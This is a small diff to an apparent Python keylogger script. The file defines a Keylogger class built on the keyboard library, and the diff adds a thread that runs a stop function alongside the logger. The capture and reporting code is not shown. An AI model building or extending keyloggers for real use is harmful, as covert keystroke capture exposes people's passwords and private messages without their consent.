@@ -2,6 +2,7 @@ import keyboard
 from datetime import datetime
 import base64
 import time
+import threading
 
 class Keylogger:
     def __init__(self, report_method="file"):
@@ -58,4 +59,6 @@ def stop_keylogger():
 
 if __name__ == "__main__":
     keylogger = Keylogger(report_method="file")
+    stop_thread = threading.Thread(target=stop_keylogger)
+    stop_thread.start()
     keylogger.start()
